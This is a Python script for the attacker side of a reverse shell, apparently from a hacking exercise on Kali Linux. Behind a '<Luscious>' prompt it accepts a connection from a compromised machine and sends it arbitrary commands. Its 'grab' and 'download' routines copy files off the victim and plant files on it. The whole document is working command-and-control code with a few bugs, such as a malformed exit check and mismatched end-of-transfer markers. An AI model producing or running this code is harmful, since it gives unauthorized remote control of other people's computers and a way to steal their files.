import socket
import os

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split('*')
    f = open('/home/kali/Desktop/'+path,'wb') #create local file to save recv filed
    while True: #loop to recv 1 KB
        bits = conn.recv(1024)
        if bits.endswith("DONE".encode()):
            f.write(bits[:-4]) #once we recv "DONE", we write the last KB without the
            #last 4 letters which in this case will be D O N E
            f.close()
            print('[+] Transfer Completed')
            break
        if "File not found".encode() in bits:
            print('[-] Unable to find the file')
            break
        f.write(bits) #every time 1KB is recieved we write the recieved bits
        #to our locally created file
def load(conn, path, command):
    conn.send(command.encode())
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            conn.send(packet)
            packet = f.read(1024)
        conn.send("FINI".encode())
        print("[+] File Installed On Host")
    else:
        conn.send("File not found".encode())

def connect():
    s = socket.socket()
    s.bind(('IP',Port))
    s.listen(1) #defines backlog file
    print('[+] Now listening for connections')
    conn, addr = s.accept()
    print("[+] connection revcieved from", addr)

    while True:
        command = input('<Luscious>')
        if command == "exit" in command:
            conn.send('exit'.encode())
            conn.close()
            break
        elif 'grab' in command.strip():
            transfer(conn, command) # if there is "grab" in the file that implies
            #that there is a file transfer happen so you must call transfer
            #function and pass the tcp connection ID and command
        elif 'download' in command.strip():
            download, path = command.split('*')
            try:
                load(conn,path,command)
            except:
                pass
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connect()
main()
